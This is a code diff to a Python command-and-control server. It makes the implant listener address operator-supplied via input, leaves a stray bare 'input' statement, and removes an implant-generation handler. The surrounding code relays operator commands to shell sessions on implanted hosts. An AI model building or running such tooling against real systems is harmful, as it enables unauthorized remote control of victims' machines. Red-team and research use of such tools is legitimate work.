@@ -3,7 +3,6 @@ import logging
 import sys
 
 from mtls import mtls
-from generate.generate import generate
 from queue import Queue
 from handler.handler import Handler
 from pb import operatorpb_pb2
@@ -17,11 +16,14 @@ class C2Server(object):
         self.shutdown = 0
         logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
 
+
         ## Generating stuff for implant comms ##
+        endpoint = input("Enter Implant Listner Address (Example: 172.17.0.2:31337)\n> ")
         print("Listening for implants...")
         self.requestq = Queue() #this is a shared queue between the handler and the listner, which fills with implant registration
         try:
-            self.implantlistener = mtls.Listener(self.requestq, "127.0.0.1:31337") #begins implant listener w/ mtls encryption
+            input
+            self.implantlistener = mtls.Listener(self.requestq, endpoint) #begins implant listener w/ mtls encryption
         except Exception as e:
             print(e)
             traceback.print_exc()
@@ -99,14 +101,6 @@ class C2Server(object):
                 else:
                     out = self._shell_session(command_str, session_id)
                     self._send_operator(out,operator,session_id)
-
-            elif message.message_type==operatorpb_pb2.Message.MessageType.Generate:
-                print("Generating the implant...")
-                logging.info("Client requested to generate")
-                generate_cmd = operatorpb_pb2.Generate()
-                generate_cmd.ParseFromString(message.data)
-                generate(generate_cmd.endpoint, generate_cmd.target_os)
-
 
 def main():
     C2Server()
